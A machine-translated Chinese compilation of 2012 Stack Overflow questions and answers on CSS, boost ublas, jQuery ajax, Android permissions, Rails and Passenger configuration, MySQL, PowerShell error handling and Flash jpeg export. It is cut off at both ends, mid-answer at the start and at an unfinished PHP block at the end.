> 时间：2012-05-20T20:17:48.663

不要为此使用jQuery，只需使用CSS。

`#numresults a:visited div{border:3px solid #777777;}`

由于隐私问题，JavaScript 无法检查 :visited 链接，但是有一些变通方法。

# c++ - 关于 boost::ublas 中的逐元素操作

> ID：10676856
> 
> 赞同：5
> 
> 时间：2012-05-20T20:15:56.707
> 
> 标签：c++, matrix, ublas

我发现 boost::ublas 不能很好地支持逐元素操作和按顺序操作（但效率相当高:)）我正在尝试

D = A^2 .* B^3 .* C

其中 A、B、C 都是相同大小的方阵，运算符“.*”表示逐元素运算，^ 是矩阵的幂。使用 boost:ublas，我写了

```
for (int n=0; n<300; n++)
{
  for (int k=0; k<300; k++)
  {
    D(n, k) = pow(abs(A(n, k)), 2)*pow(abs(B(n, k)), 3)*C(n, k);
  }
} 
```

在我的程序中，我有许多类似上面显示的后续操作，无论如何我可以获得相同的结果，但使用一行代码而不是循环？

另外，我观察到为矩阵或向量的所有元素分配一个常数似乎是无效的

boost::numeric::ublas::vector v(100); v = 0.2；

相反，我必须使用循环再次进行分配，有更好的方法来保存一些代码吗？我的算法真的很长，并且有很多像上面提到的那样繁琐的操作。我尝试了另一个数值库 Armadillo，它提供了一种简化操作的好方法，但它目前不假设稀疏矩阵（它将花费大约 10 次运行我的代码）。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-22T13:14:22.143

您可以很容易地将常量分配给向量或矩阵：

```
vector<double> v = scalar_vector<double>(100, 0.2); 
```

常规向量（但不是 c_vector 或 bounded_vector）甚至有一个构造函数：

```
vector<double> v(100, 0.2); 
```

至于元素操作，您也可以轻松定义自己的，它只是样板代码，例如绝对权力:)：

```
namespace boost { namespace numeric { namespace ublas {
template<class M, class P>
struct scalar_power:
    public scalar_binary_functor<M, P> {
    typedef typename scalar_binary_functor<M, P>::argument1_type argument1_type;
    typedef typename scalar_binary_functor<M, P>::argument2_type argument2_type;
    typedef typename scalar_binary_functor<M, P>::result_type result_type;

    static BOOST_UBLAS_INLINE
    result_type apply (argument1_type t1, argument2_type t2) {
        return pow(abs(t1), t2);
    }
};

template<class M, class P>
BOOST_UBLAS_INLINE
typename enable_if< is_convertible<P, typename M::value_type>,
typename matrix_binary_scalar2_traits<M, const P, scalar_power<typename M::value_type, P> >::result_type
>::type
operator ^ (const matrix_expression<M> &m,
            const P &p) {
    typedef typename matrix_binary_scalar2_traits<M, const P, scalar_power<typename M::value_type, P> >::expression_type expression_type;
    return expression_type (m(), p);
}
}}} 
```

在此之后，您的表达式变为：

```
D = element_prod(A^2, element_prod(B^3, C)); 
```

# rest - restlet post 方法参数始终为空

> ID：10676857
> 
> 赞同：0
> 
> 时间：2012-05-20T20:15:59.597
> 
> 标签：rest, restlet

我有一个简单的表格：

```
<form action="send_email" method="post">
<input type="text" id="message">
<button type="submit">Send</button>
</form> 
```

它转到`handlePost`我资源中的方法。但是`Representation entity`总是传递 null。

```
@Post
public Representation handlePost(Representation entity) throws ResourceException{
    Form form = new Form(entity);  
    ...
    return StringRepresentation("test");
    } 
```

为什么是这样？如何获取表单输入值？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T21:25:05.760

得到了答案。愚蠢的错误。我必须将`name`属性放在元素中

```
<input type="text" id="message" name="message"> 
```

# ajax - jQuery $.ajax 不会传递数组

> ID：10676860
> 
> 赞同：1
> 
> 时间：2012-05-20T20:16:27.110
> 
> 标签：ajax, arrays, jquery

我正在尝试使用 jQuery 传递这样的数组，但 PHP 脚本从未接收到它，并且通过 Chrome 的网络跟踪查看仅`title`传递。

```
var items = new Array();

items[0] = new Array();
items[0]['code'] = '1234';
items[0]['checked'] = true;

items[1] = new Array();
items[1]['code'] = '4524';
items[1]['checked'] = false; 
```

这是执行 AJAX 请求的代码：

```
var sUrl = "<?= base_url(); ?>list/create/";
var serialized = {
    title: 'Some Value Here',
    items: items
};
$.ajax({
    url: sUrl,
    type: "POST",
    data: serialized,
    success: function(data) {
        alert(data);
        list_id = data;
    }
}); 
```

问题似乎是jQuery无法序列化它。有没有办法解决？谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-20T20:21:59.590

当您像这样创建 items 对象时会发生什么：

```
var items = [
    {
        code: '1234'
        , checked: true
    }
    ,{
        code: '4568'
        , checked: false
    }
]; 
```

我认为问题在于，当您应该只创建一个标准对象时，您正在使用内部对象创建一个数组。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-20T20:27:54.863

实际上，您创建了一个数组，而数组不能用字符串索引。如果必须使用字符串作为索引，则应使用 Jason 的回答中提供的 object 或：

```
items = new Array();

items[0] = new Object();
items[0]['code'] = '1234';
items[0]['checked'] = true; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-20T20:28:47.840

您正在为`new Array`中的每个索引分配 a `items`，但随后您正在为该数组分配一个新的`code`and属性。`checked`这没有正确序列化，因为不是在数组中的每个位置都有一个对象，而是在另一个数组中添加了一些随机属性 ( `code`and `checked`)。

尝试为数组中的每个位置分配一个对象文字：

```
var items = [];

items[0] = {
    code: '1234',
    checked: true
};

items[1] = {
    code: '4524',
    checked: false
}; 
```

# java - 为什么我收到 HttpHostConnectException

> ID：10676861
> 
> 赞同：9
> 
> 时间：2012-05-20T20:16:36.533
> 
> 标签：java, android, exception

我在android虚拟机中使用以下代码

```
 try{
       HttpClient httpclient = new DefaultHttpClient();
       HttpPost httppost = new HttpPost("http://10.0.2.2/ReadingFromServer.php");
       httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
       HttpResponse response = httpclient.execute(httppost);
       HttpEntity entity = response.getEntity();
       is = entity.getContent();
       }catch(Exception e){
           Log.e("log_tag", "Error in http connection"+e.toString());
      } 
```

我收到了 HttpHostConnectException。不知道为什么？我已将 url 中的地址从 127.0.0.1 更改为 10.0.2.2 但仍然出现该异常。我的计算机中安装了 wamp 服务器，并且文件“ReadingFromServer.php”位于“www”文件夹中。

这是完整的堆栈跟踪

```
05-20 20:40:32.218: W/System.err(681): org.apache.http.conn.HttpHostConnectException: Connection to http://10.0.2.2 refused
05-20 20:40:32.248: W/System.err(681):  at org.apache.http.impl.conn.DefaultClientConnectionOperator.openConnection(DefaultClientConnectionOperator.java:183)
05-20 20:40:32.258: W/System.err(681):  at org.apache.http.impl.conn.AbstractPoolEntry.open(AbstractPoolEntry.java:164)
05-20 20:40:32.268: W/System.err(681):  at org.apache.http.impl.conn.AbstractPooledConnAdapter.open(AbstractPooledConnAdapter.java:119)
05-20 20:40:32.278: W/System.err(681):  at org.apache.http.impl.client.DefaultRequestDirector.execute(DefaultRequestDirector.java:360)
05-20 20:40:32.288: W/System.err(681):  at org.apache.http.impl.client.AbstractHttpClient.execute(AbstractHttpClient.java:555)
05-20 20:40:32.298: W/System.err(681):  at org.apache.http.impl.client.AbstractHttpClient.execute(AbstractHttpClient.java:487)
05-20 20:40:32.308: W/System.err(681):  at org.apache.http.impl.client.AbstractHttpClient.execute(AbstractHttpClient.java:465)
05-20 20:40:32.318: W/System.err(681):  at com.test.TestProjectActivity.onCreate(TestProjectActivity.java:56)
05-20 20:40:32.328: W/System.err(681):  at android.app.Activity.performCreate(Activity.java:4465)
05-20 20:40:32.338: W/System.err(681):  at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1049)
05-20 20:40:32.348: W/System.err(681):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1920)
05-20 20:40:32.358: W/System.err(681):  at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:1981)
05-20 20:40:32.368: W/System.err(681):  at android.app.ActivityThread.access$600(ActivityThread.java:123)
05-20 20:40:32.378: W/System.err(681):  at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1147)
05-20 20:40:32.388: W/System.err(681):  at android.os.Handler.dispatchMessage(Handler.java:99)
05-20 20:40:32.398: W/System.err(681):  at android.os.Looper.loop(Looper.java:137)
05-20 20:40:32.408: W/System.err(681):  at android.app.ActivityThread.main(ActivityThread.java:4424)
05-20 20:40:32.418: W/System.err(681):  at java.lang.reflect.Method.invokeNative(Native Method)
05-20 20:40:32.428: W/System.err(681):  at java.lang.reflect.Method.invoke(Method.java:511)
05-20 20:40:32.438: W/System.err(681):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:784)
05-20 20:40:32.448: W/System.err(681):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551)
05-20 20:40:32.448: W/System.err(681):  at dalvik.system.NativeStart.main(Native Method)
05-20 20:40:32.468: W/System.err(681): Caused by: java.net.ConnectException: socket failed: EACCES (Permission denied)
05-20 20:40:32.488: W/System.err(681):  at org.apache.http.impl.conn.DefaultClientConnectionOperator.openConnection(DefaultClientConnectionOperator.java:181)  
05-20 20:40:32.498: W/System.err(681):  ... 21 more
05-20 20:40:32.508: W/System.err(681): Caused by: java.net.SocketException: socket failed: EACCES (Permission denied)
05-20 20:40:32.528: W/System.err(681):  at libcore.io.IoBridge.socket(IoBridge.java:573)
05-20 20:40:32.538: W/System.err(681):  at java.net.PlainSocketImpl.create(PlainSocketImpl.java:201)
05-20 20:40:32.548: W/System.err(681):  at java.net.Socket.checkOpenAndCreate(Socket.java:663)
05-20 20:40:32.558: W/System.err(681):  at java.net.Socket.connect(Socket.java:807)
05-20 20:40:32.578: W/System.err(681):  at org.apache.http.conn.scheme.PlainSocketFactory.connectSocket(PlainSocketFactory.java:119)
05-20 20:40:32.578: W/System.err(681):  at org.apache.http.impl.conn.DefaultClientConnectionOperator.openConnection(DefaultClientConnectionOperator.java:144)
05-20 20:40:32.588: W/System.err(681):  ... 21 more
05-20 20:40:32.598: W/System.err(681): Caused by: libcore.io.ErrnoException: socket failed: EACCES (Permission denied)
05-20 20:40:32.628: W/System.err(681):  at libcore.io.Posix.socket(Native Method)
05-20 20:40:32.658: W/System.err(681):  at libcore.io.BlockGuardOs.socket(BlockGuardOs.java:181)
05-20 20:40:32.658: W/System.err(681):  at libcore.io.IoBridge.socket(IoBridge.java:558) 
```

谢谢。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-05-20T20:42:50.250

您是否在 AndroidManifest.xml 中声明了 Internet 权限？

您需要将以下内容放入 AndroidManifest.xml

```
<manifest> 
  ...
  <uses-permission android:name="android.permission.INTERNET"/>
</manifest> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-20T20:45:15.530

`manifest`通过在您的标记下添加此应用程序的 Internet 权限`AndroidManifest.xml`

```
<uses-permission android:name="android.permission.INTERNET" /> 
```

否则 Android 将阻止来自您应用的互联网流量

# ruby-on-rails - 与 FactoryGirl 的递归关联

> ID：10676867
> 
> 赞同：0
> 
> 时间：2012-05-20T20:17:13.327
> 
> 标签：ruby-on-rails, ruby-on-rails-3, activerecord, factory-bot

我有一个`category`模型。我正在使用祖先 gem 使它像一个树结构，这样我们就可以有子类别。我有一个简单的工厂`category`，看起来像这样

```
factory :category do
  sequence(:name) { |n| "Category #{n}"}
end 
```

我有另一个`business`具有 a`main_category`和 a 的模型`sub_category`。这是我的工厂

```
factory :business do
  sequence(:name) { |n| "businnes#{n}"}
  sequence(:email) { |n| "busixy#{n}@example.com"}
  sequence(:website) { |n| "www.example#{n}.com"}
  association(:main_sub_category)
  main_category          {Business.main_sub_category.parent}

end 
```

我在这里要做的是分配`main_sub_category`一个`business`新类别，即 a并将其分配给业务`sub_category`的父级。`category``main_category`

为此，我创建了一个名为 sub_category factory 的新工厂：category do sequence(:name) { |n| "Category #{n}"} 工厂 :subcategory do |sub| sub.parent factory :category end end

当我尝试上面的代码时，我得到了这个错误

```
Factory already registered: category (FactoryGirl::DuplicateDefinitionError) 
```

我尝试了另一种方法来做到这一点

```
 factory :category do
      sequence(:name) { |n| "Category #{n}"}
      factory :subcategory do |sub|
        sub.parent {FactoryGirl.create(:category)}
      end
    end 
```

这种方式可以工作，但是当我使用工厂创建业务对象时

```
@business = FactoryGirl.create :business 
```

它给了我验证错误

```
ActiveRecord::RecordInvalid: Validation failed: Name has already been taken 
```

我对类别名称进行了唯一性验证。

任何人都有过这种递归工厂问题的帮助。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-20T20:36:28.873

解决了，由于某种神秘的原因，我不明白我的测试数据库已经有一个名为 Category1 的类别的条目，它正在创建问题，使用 mysql 控制台手动删除了该行，现在一切正常。

我仍然想知道为什么数据库不清楚，因为我从不直接写测试数据库，它是执行它的测试用例..：S

# c# - 如何为日期和一些自定义掩码制作文本框掩码

> ID：10676868
> 
> 赞同：2
> 
> 时间：2012-05-20T20:17:15.580
> 
> 标签：c#, asp.net, gridview

我正在尝试在一些模板项目的网格视图中制作一些带有掩码的文本框。

例如：[_ _ - _ _ _ _ ] - 所以它允许你添加 2 个字母，然后它会向前移动，你将继续添加 4 个数字

对于日期：[dd-mm-year] - 所以如果我输入日期，我不应该添加字符 '-' 。

我对口罩不太熟悉，如果有人不介意提供帮助，我将不胜感激

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-20T20:30:29.990

您是否考虑过使用 jQuery？客户端，非常灵活和快速。

这是一个我用过很多的很酷的插件。

[http://digitalbush.com/projects/masked-input-plugin/](http://digitalbush.com/projects/masked-input-plugin/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-20T20:51:59.910

你应该阅读这个链接

[http://www.asp.net/ajaxLibrary/AjaxControlToolkitSampleSite/MaskedEdit/MaskedEdit.aspx](http://www.asp.net/ajaxLibrary/AjaxControlToolkitSampleSite/MaskedEdit/MaskedEdit.aspx)

此控件可用于`AjaxControlToolkit`

> **什么是 ASP.NET AJAX 控件工具包？**
> 
> ASP.NET AJAX Control Toolkit 是一个建立在 Microsoft ASP.NET AJAX 框架之上的开源项目。它是 Microsoft 和 ASP.NET AJAX 社区的共同努力，它提供了一个强大的基础架构来编写可重用、可定制和可扩展的 ASP.NET AJAX 扩展程序和控件，以及可以开箱即用的丰富控件数组创建交互式 Web 体验。

# c# - 如何使用函数 SetEndpointAddress？

> ID：10676869
> 
> 赞同：-2
> 
> 时间：2012-05-20T20:17:37.087
> 
> 标签：c#, wcf, self-hosting

应该用什么代替??? （第一个参数）

```
serviceHost = new ServiceHost(typeof(MyService));    
serviceHost.SetEndpointAddress(???, "http://cvxcvxcvcx"); 
```

我在配置文件中指定了端点，我该怎么做才能召回他？我可以在这个功能中召回他吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T20:33:24.613

[取自 MSDN](http://msdn.microsoft.com/en-us/library/system.servicemodel.servicehostbase.setendpointaddress.aspx#Y0)

> ServiceHostBase.SetEndpointAddress 方法 将指定端点的端点地址设置为指定地址。
> 
> ```
> public void SetEndpointAddress(ServiceEndpoint endpoint, string relativeAddress) 
> ```
> 
> 参数
> 
> endpoint
> 类型：System.ServiceModel.Description.ServiceEndpoint
> 服务端点。
> 
> relativeAddress
> 类型：System.String
> 端点地址。

为了更好地理解你应该阅读它[WSDL-first approach: How to specify different names for wsdl:port and wsdl:binding?](https://stackoverflow.com/questions/4704148/wsdl-first-approach-how-to-specify-different-names-for-wsdlport-and-wsdlbindi)

# ruby-on-rails - 不是一个有效的目录（在网上没有找到答案）

> ID：10676871
> 
> 赞同：1
> 
> 时间：2012-05-20T20:17:50.200
> 
> 标签：ruby-on-rails, apache, passenger, redmine

这是我的问题，我在 ubuntu 12 下进行了标准的 rail 和 redmine 安装。我有这个错误：目录“/var/www”似乎不是有效的 Ruby on Rails 应用程序根目录。

这似乎是一个常见错误，但在网上没有解决方案： [http ://www.google.fr/search?q=The+directory+%22%2Fvar%2Fwww%22+does+not+appear+to+be+ a+valid+Ruby+on+Rails+application+root.+&ie=utf-8&oe=utf-8&aq=t&rls=org.mozilla:fr:official&client=firefox-a](http://www.google.fr/search?q=The+directory+%22%2Fvar%2Fwww%22+does+not+appear+to+be+a+valid+Ruby+on+Rails+application+root.+&ie=utf-8&oe=utf-8&aq=t&rls=org.mozilla:fr:official&client=firefox-a)

这是我的默认文件：

```
<VirtualHost *:80>
        ServerAdmin webmaster@localhost

        DocumentRoot /var/www

<Directory />
                Options FollowSymLinks
                AllowOverride None
        </Directory>
        <Directory /var/www/>
                Options Indexes FollowSymLinks MultiViews
                AllowOverride None
                Order allow,deny
                allow from all
        </Directory>

        ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
        <Directory "/usr/lib/cgi-bin">
                AllowOverride None
                Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
                Order allow,deny
                Allow from all
        </Directory>

        ErrorLog ${APACHE_LOG_DIR}/error.log

        # Possible values include: debug, info, notice, warn, error, crit,
        # alert, emerg.
        LogLevel warn

        CustomLog ${APACHE_LOG_DIR}/access.log combined

    <Directory "/usr/share/doc/">
        Options Indexes MultiViews FollowSymLinks
        AllowOverride None
        Order deny,allow
        Deny from all
        Allow from 127.0.0.0/255.0.0.0 ::1/128
    </Directory>

PassengerDefaultUser www-data
RailsEnv production
RailsBaseURI /redmine
<Directory /var/www/redmine/>

AllowOverride None
AddHandler fcgid-script .fcgi
Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
Order allow,deny
Allow from all

PassengerEnabled on
RailsBaseURI /redmine
PassengerResolveSymlinksInDocumentRoot on
</Directory>

</VirtualHost>
Include /etc/apache2/mods-available/passenger.conf 
```

和我的乘客.conf：

```
<IfModule mod_passenger.c>
  PassengerRoot /usr
  PassengerRuby /usr/bin/ruby
  PassengerDefaultUser www-data
</IfModule> 
```

我不明白为什么......问候比西尔

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-20T22:11:46.230

您应该将 DocumentRoot 指向`public`rails 应用程序内的目录

```
DocumentRoot /var/www/YOUR_APP_NAME/public 
```

[...]

```
<Directory /var/www/YOUR_APP_NAME/public> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-20T21:42:24.253

`DocumentRoot`对于乘客下的 Rails 应用程序，应该是应用程序的`public`目录。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-11-01T20:42:49.213

某些安装说明在创建 simlink 时出错。使用正确的simlink如下。

`sudo ln -s /usr/share/redmine /var/www/redmine`

虚拟主机应该是这样的：

```
<VirtualHost *:80>
  ServerName redmine.yourdomain.tld  

  DocumentRoot /var/www/redmine/public  

  PassengerMaxPoolSize 4
  PassengerDefaultUser www-data
  RailsEnv production
  RailsBaseURI /  

  <Directory /var/www/redmine/public>
    Options FollowSymLinks
    AllowOverride None
    Order allow,deny
    Allow from all
  </Directory>  

  LogLevel info
  ErrorLog /var/log/apache2/redmine-error.log
  CustomLog /var/log/apache2/redmine-access.log combined
</VirtualHost> 
```

# mysql - MySQL 实体和实体的别名：如何删除 UNION？

> ID：10676873
> 
> 赞同：3
> 
> 时间：2012-05-20T20:18:01.703
> 
> 标签：mysql, sql, performance, union

我在数据库中有这些表：

*   实体（ID、名称、已删除）
*   实体别名（实体 ID，别名 ID）
*   别名（ID，名称）

此查询工作正常，但由于 UNION 很慢，请注意 entity.name 如何与 aliases.name 交换并移至最后一列：

```
SELECT entities.id, entities.name, entities.deleted, NULL AS main_name
FROM entities
UNION
SELECT entities.id, aliases.name, entities.deleted, entities.name AS main_name
FROM entities
JOIN entities_aliases ON entities_aliases.entity_id = entities.id
JOIN aliases ON entities_aliases.alias_id = aliases.id
ORDER BY name 
```

这种交换对我来说非常重要，我无法删除它，但是随着数据库在宽度（更多字段和链接）和深度（更多记录）方面的发展，UNION 会变得越来越慢。我怎样才能摆脱 UNION？

**补充：** 我需要的输出。例如，我们有实体 1-AAA 和他的别名 1-BBB 和 2-CCC。输出应该是：

*   AAA
*   BBB (AAA)
*   CCC (AAA)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T21:32:14.813

我认为您可以使用 LEFT JOINS 和一些 IF 来实现它：

```
SELECT e.id, IFNULL( a.name, e.name ) AS name, e.deleted, IF( a.name IS NULL, NULL, e.name ) AS main_name
FROM entities AS e
LEFT JOIN entities_aliases AS ea ON e.id = ea.entity_id
LEFT JOIN aliases AS a ON ea.alias_id = a.id; 
```

如果我明白你想要什么，如果没有别名（按此顺序），你希望“name”是别名或实体名，当你没有别名时 main_name 为空，当你没有别名时实体名你确实有别名。我希望它有帮助！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-20T20:37:19.237

以下查询仅使用 UNION ALL 而不是 UNION：

```
SELECT *
FROM ((SELECT entities.id, entities.name, entities.deleted, NULL AS main_name
       FROM entities
      ) union all
      (SELECT entities.id, aliases.name, entities.deleted, entities.name AS main_name
       FROM entities e join
            entities_aliases ea
            ON ea.entity_id = e.id JOIN
            aliases a
            ON ea.alias_id = a.id
     )
    ) e
ORDER BY name 
```

UNION ALL 从查询中删除“不同的”进程。

良好的格式*我主观地定义为我做事的方式）使我更容易看到查询。还：

1.  确保entities.entity_id 是实体的主键。
2.  确保 alias.id 是别名的主键。

您没有进行任何过滤，因此 entity_aliases 上的外键关系是可选的。

# powershell - Powershell：生产中的调试/良好的异常处理

> ID：10676875
> 
> 赞同：1
> 
> 时间：2012-05-20T20:18:34.957
> 
> 标签：powershell, powershell-2.0

在生产中分析 powershell cmdlet 的最佳方法是什么？假设您编写了一个执行以下操作的脚本 -

> 1.  写入注册表值的 lof
> 2.  注册 COM Dll
> 3.  制作 IIS 应用程序池
> 4.  启动 Windows 服务

&...中间出了点问题，那么通知用户以便可以跟踪和调试根问题的最佳实践是什么？

> 假设，由于某种原因，用户凭证创建 AppPool 失败，我想在那个时候停止处理，而且我想回滚我之前所做的事情。

详细模式 + 记录是在每一步收集每个细节的优雅方式吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-20T20:35:15.393

我编写了一个`Write-Log`在 poshcode ( [http://poshcode.org/3270](http://poshcode.org/3270) ) 上发布的函数，用于生产级 PowerShell 程序。或者，您可以使用`Start-Transcript`which 将控制台上显示的几乎所有内容记录到文件中。有几个关于`Start-Transcript`-

1.  它不会记录外部程序输出，除非您通过主机输出 API 将其通过管道传输到`Out-Host`诸如`ping.exe localhost | Out-Host`.
2.  并非所有主机都支持。例如 PowerGUI 不支持它，因此您必须使用`$host`.

我通常用于错误处理的模式是将所有内容包装在 try/catch 中。异常对象将`$_`在 catch 块中可用。它将包含有关发生的错误的所有信息、消息、行号和列号等...

我还将 设置`$ErrorActionPreference`为`Stop`以便所有 cmdlet 都会引发终止错误，因此脚本不会继续。它看起来像这样：

```
$ErrorActionPreference = "Stop"
try {
    # Write lof of registry values
    New-Item -Path HKCU:\Software\MyTest -ItemType Directory
    New-ItemProperty -Path HKCU:\Software\MyTest -Name MyTestValue -Value Test

    # Register COM Dlls
    regsrv32 my.dll
    if ($LASTEXITCODE -ne 0) { throw "Failed to register my.dll" }

    # Make IIS AppPools
    IIS:\>New-WebAppPool NewAppPool

    # Start Windows Services
    Start-Service -Name MyService
} catch {
    Write-Log ("Script failed. The error was: '{0}'." -f $_)
} 
```

回滚并不容易......唯一可能容易回滚的是注册表操作，因为注册表支持事务（假设 Vista 或更高版本）。您可以只创建一个事务（如数据库）并在发生错误时将其回滚。您提到的其余操作将需要特定的代码来回滚它们。您可以像这样将回滚代码添加到 catch 块中：

```
} catch {
    # Undo the registry transaction.
    # Unregister the DLL.
    # Delete the App pool if it exists.
    # Stop the windows service.
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-20T20:44:53.177

对于直接注册表操作，您可以使用 PowerShell 的事务支持在脚本整体成功时提交更改或撤消事务以回滚注册表更改，例如：

```
try {
    $ErrorActionPreference = 'Stop' # convert all errors to terminating errors
    Start-Transaction
    Set-ItemProperty Acme -Name Count -Value 99 -UseTransaction
    Remove-ItemProperty Acme -Name InstallDir -UseTransaction
    New-Item Acme2 -UseTransaction
    New-ItemProperty Acme2 -Name Count -Value 2 -UseTransaction
    New-ItemProperty Acme2 -Name InstallDir -Value 'C:\Program Files\Acme2' -UseTx

    ... do other stuff ...

    Complete-Transaction
}
catch {
    Undo-Transaction
    ... Log failure ...
} 
```

# ios - 如何使用 Monotouch 获取行高？

> ID：10676877
> 
> 赞同：2
> 
> 时间：2012-05-20T20:18:44.503
> 
> 标签：ios, uitableview, xamarin.ios, height, row

我有一个带有行（自定义单元格）的表格视图。如果用户点击行，行的高度会发生变化（使用 ReloadRows 和覆盖的 GetHeightForRow 方法）。当用户点击已经选择的行时，我想改变行的高度。

是否可以在覆盖的 GetHeightForRow() 方法中获得以前的高度？那应该可以解决一个问题。

就像展开/折叠一样，但我不知道如何正确简单地实现它..

提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-20T20:45:24.600

好吧，您应该记住 UITableViewDelegate 中的最后一个选择行，如果它是同一行，您必须折叠该行。

像这样的东西：

```
 public override void RowSelected (
            UITableView tableView, NSIndexPath indexPath)
        {
            if (selectedRow == indexPath.Row)
            {
                Collapse();
            }
            else
            {
                Expand();
            }

            selectedRow = indexPath.Row;

            Console.WriteLine(
                "TableViewDelegate.RowSelected: Label={0}",
                 list[indexPath.Row]);
        } 
```

# css - 如何在一个div中创建多个列

> ID：10676881
> 
> 赞同：19
> 
> 时间：2012-05-20T20:19:04.917
> 
> 标签：css, html, text, border

我想知道如何在 div 中创建多个列。这是一个页脚，我想要一个站点地图、社交媒体链接等。

我打算使用`<multicol>`，但后来我读到它已被弃用，所以有点让我停止使用它。

基本上我有一个 80% 宽的 DIV，我需要其中的三列。最好每个都有一个边距。

CSS：

```
 div.bottom
        {
            height: 200px;
            width: 80%;
            margin-left: auto;
            margin-right: auto;
            margin-top: none;
            margin-bottom: none;
            border-top: 4px solid #00ccff;
            border-bottom-left-radius: 15px;
            border-bottom-right-radius: 15px;
            background-color: #575757;
        } 
```

我现在只需要 HTML。感谢您的时间。

* * *

## 回答 #1

> 赞同：45
> 
> 时间：2012-05-20T20:20:22.547

用（或右）创建三个 div，`float: left;`并给它们一个精确的`width`.

```
<div class="bottom">
  <div style="float: left; width: 33%;"></div>
  <div style="float: left; width: 33%;"></div>
  <div style="float: left; width: 33%;"></div>
</div> 
```

看到它[在行动](http://jsfiddle.net/qdwtT/)。

# php - 使用 PHP 从文本文件创建 ZIP 文件

> ID：10676887
> 
> 赞同：0
> 
> 时间：2012-05-20T20:20:16.930
> 
> 标签：php, zip

我有一个文本文件，其中包含服务器中多个文件的路径，每行 1 个文件，有没有办法读取这些行并从 em 创建一个 zip？

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-20T20:23:32.273

PHP 具有创建 zip 的功能。

这是一个简单的例子：[http ://davidwalsh.name/create-zip-php](http://davidwalsh.name/create-zip-php)

您需要读取文件名，将它们放入列表中，然后使用示例中的函数。

# ruby-on-rails - 将特征数组分配给模型

> ID：10676892
> 
> 赞同：0
> 
> 时间：2012-05-20T20:21:05.680
> 
> 标签：ruby-on-rails

我有一个模型“汽车”，它有很多“功能”。我将所有功能保存在一个单独的模型“功能”中。创建汽车时，我想让用户（通过复选框）选择新车应具有的功能。

现在我正在做这样的事情，这是错误的，但我没有其他想法：

```
= f.label 'other features'
- Feature.all.each do |feature|
  = f.check_box :feature 
```

我怎么能做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-20T20:28:40.413

```
- Feature.all.each do |feature|
  = check_box_tag "car[feature_ids][]", feature.id 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-20T20:28:47.123

由于`feature`是一个关联，因此您必须使用`f.fields_for`，这将产生另一个 formbuilder 对象。`fields_for`在[Rails API](http://api.rubyonrails.org)中查找以了解如何在您的情况下正确使用它，我暂时没有想到它。:)

# actionscript-3 - AS3 - 从 Flash 编码和导出多个 jpeg

> ID：10676894
> 
> 赞同：0
> 
> 时间：2012-05-20T20:21:43.997
> 
> 标签：actionscript-3, flash

我目前有一个 Flash (AS3) 项目，它由一个用户可以在其上绘制内容的画板组成。我想把这个绘制的内容记录为一系列的jpeg截图，并在绘图区域放置了一个“记录”和“停止”按钮。我正在尝试获取以下代码以实现以下目标：

1）按下“记录”时，应捕获15个屏幕截图（位图）并将其存储在“jpgSource”数组中最多一分钟。

2）当按下“停止”时，截图功能应该停止，所有存储在jpgSource中的位图都应该转换为jpegs，并且所有jpegs应该导出到一个php处理程序。

目前，当我运行此代码时，php 代码只吐出一个 jpeg 图像（最后一张）。如果有人能指出我哪里出错了，我将不胜感激。

**编辑：我发现 NavigateToUrl 每帧只能运行一次，解释了我一直遇到的错误。我在这里（http://www.actionscript.org/forums/showthread.php3?t=250594）读到，可以使用计时器来绕过这个问题，但我不太确定在这种情况下如何实现。一如既往，我将非常感谢任何建议。**

```
var sourceArray:Array = [];

var myTimer:Timer = new Timer(50,200);
myTimer.addEventListener(TimerEvent.TIMER, timerListener);
function timerListener (e:TimerEvent):void {
var jpgSource:BitmapData = new BitmapData (850, stage.height);
jpgSource.draw(stage);
sourceArray.push(jpgSource);        
}

recordbutton.addEventListener(MouseEvent.CLICK, recordbuttonClick);
stopbutton.addEventListener(MouseEvent.CLICK, stopbuttonClick);

function recordbuttonClick(ev:MouseEvent):void
{   
myTimer.start();
}

function stopbuttonClick(ev:MouseEvent):void
{
myTimer.stop();
    var jpgEncoder:JPGEncoder = new JPGEncoder(50);
    for (var i:Number=1; i<sourceArray.length; i++){
    var jpgStream:ByteArray = jpgEncoder.encode(sourceArray[i]);
    var header:URLRequestHeader = new URLRequestHeader("Content-type", "application/octet-stream");
    var jpgURLRequest:URLRequest = new URLRequest("imageprocess.php?name=drawing.jpg");
    jpgURLRequest.requestHeaders.push(header);
    jpgURLRequest.method = URLRequestMethod.POST;
    jpgURLRequest.data = jpgStream;
    navigateToURL(jpgURLRequest, "blank");
} 
```

PHP：

```
<?php
